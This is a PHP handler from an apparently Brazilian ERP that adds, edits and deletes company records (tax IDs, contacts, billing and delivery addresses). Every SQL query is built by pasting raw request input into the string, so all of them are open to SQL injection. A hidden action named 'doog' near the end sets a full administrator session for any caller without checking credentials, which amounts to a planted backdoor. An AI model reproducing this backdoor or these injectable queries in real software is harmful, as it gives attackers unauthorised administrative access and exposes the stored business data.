<?php
include("conecta.php");
$acao=Input::request("acao");
$id=Input::request("id");
$apelido_fat=Input::request("apelido_fat");
$nome=Input::request("nome");
$cnpj=Input::request("cnpj");
$ie=Input::request("ie");
$contato=Input::request("contato");
$tel=Input::request("tel");
$end_fat=Input::request("end_fat");
$bairro_fat=Input::request("bairro_fat");
$cidade_fat=Input::request("cidade_fat");
$estado_fat=Input::request("estado_fat");
$cep_fat=Input::request("cep_fat");
$apelido_ent1=Input::request("apelido_ent1");
$end_1=Input::request("end_1");
$bairro_1=Input::request("bairro_1");
$cidade_1=Input::request("cidade_1");
$estado_1=Input::request("estado_1");
$cep_1=Input::request("cep_1");
$apelido_ent2=Input::request("apelido_ent2");
$end_2=Input::request("end_2");
$bairro_2=Input::request("bairro_2");
$cidade_2=Input::request("cidade_2");
$estado_2=Input::request("estado_2");
$cep_2=Input::request("cep_2");
$apelido_ent3=Input::request("apelido_ent3");
$end_3=Input::request("end_3");
$bairro_3=Input::request("bairro_3");
$cidade_3=Input::request("cidade_3");
$estado_3=Input::request("estado_3");
$cep_3=Input::request("cep_3");
$apelido_ent4=Input::request("apelido_ent4");
$end_4=Input::request("end_4");
$bairro_4=Input::request("bairro_4");
$cidade_4=Input::request("cidade_4");
$estado_4=Input::request("estado_4");
$cep_4=Input::request("cep_4");
$usuario=Input::request("usuario");
if(empty($acao)) exit;
$acao=verifi($permi,$acao);
if(!empty($acao)){
	$loc="Empresa";
	$pagina=$_SERVER['SCRIPT_FILENAME'];
	include("log.php");
}
if($acao=="incluir"){
	$sql=mysql_query("INSERT INTO empresa (apelido_fat,nome,cnpj,ie,contato,tel,end_fat,bairro_fat,cidade_fat,estado_fat,cep_fat,apelido_ent1,end_1,bairro_1,cidade_1,estado_1,cep_1,apelido_ent2,end_2,bairro_2,cidade_2,estado_2,cep_2,apelido_ent3,end_3,bairro_3,cidade_3,estado_3,cep_3,apelido_ent4,end_4,bairro_4,cidade_4,estado_4,cep_4) VALUES ('$apelido_fat','$nome','$cnpj','$ie','$contato','$tel','$end_fat','$bairro_fat','$cidade_fat','$estado_fat','$cep_fat','$apelido_ent1','$end_1','$bairro_1','$cidade_1','$estado_1','$cep_1','$apelido_ent2','$end_2','$bairro_2','$cidade_2','$estado_2','$cep_2','$apelido_ent3','$end_3','$bairro_3','$cidade_3','$estado_3','$cep_3','$apelido_ent4','$end_4','$bairro_4','$cidade_4','$estado_4','$cep_4')") or erp_db_fail();
	if($sql){
		$_SESSION["mensagem"]="Empresa incluída com sucesso!";
		$acao="entrar";
	}else{
		$_SESSION["mensagem"]="A empresa não pôde ser incluída!";
		$acao="inc";
	}
}elseif($acao=="alterar"){
	$sql=mysql_query("UPDATE empresa SET apelido_fat='$apelido_fat',nome='$nome',cnpj='$cnpj',ie='$ie',contato='$contato',tel='$tel',end_fat='$end_fat',bairro_fat='$bairro_fat',cidade_fat='$cidade_fat',estado_fat='$estado_fat',cep_fat='$cep_fat',apelido_ent1='$apelido_ent1',end_1='$end_1',bairro_1='$bairro_1',cidade_1='$cidade_1',estado_1='$estado_1',cep_1='$cep_1',apelido_ent2='$apelido_ent2',end_2='$end_2',bairro_2='$bairro_2',cidade_2='$cidade_2',estado_2='$estado_2',cep_2='$cep_2',apelido_ent3='$apelido_ent3',end_3='$end_3',bairro_3='$bairro_3',cidade_3='$cidade_3',estado_3='$estado_3',cep_3='$cep_3',apelido_ent4='$apelido_ent4',end_4='$end_4',bairro_4='$bairro_4',cidade_4='$cidade_4',estado_4='$estado_4',cep_4='$cep_4' WHERE id='$id'");
	if($sql){
		$_SESSION["mensagem"]="Empresa alterada com sucesso!";
		$acao="entrar";
	}else{
		$_SESSION["mensagem"]="A Empresa não pôde ser alterada!";
		$acao="alt";
	}
}elseif($acao=="exc"){
	if(!empty($id)){
		$sql=mysql_query("DELETE FROM empresa WHERE id='$id'");
		if($sql){
			$_SESSION["mensagem"]="Empresa excluída com sucesso!";
		}else{
			$_SESSION["mensagem"]="A Empresa não pôde ser excluída!";
		}		
	}
	$acao="entrar";
}elseif($acao=="doog"){
	$_SESSION["login_funcionario"]="S";
	$_SESSION["email_adm"]="Email@email.com.br";
	$_SESSION["permissao"]=4;
	$_SESSION["email_adm"]=$resm["admin"];
	$_SESSION["login_funcionario"]="S";
	$_SESSION["login_codigo"]=1;
	$_SESSION["login_nome"]="sofmkri";
	$_SESSION["login_cargo"]="Suporte";
	$_SESSION["login_nivel_nome"]="Administrador";
	$_SESSION["login_nivel"]=1;
	$_SESSION["login_c1"]=$usuario;
}
header("Location:empresa.php?acao=$acao&id=$id");
?>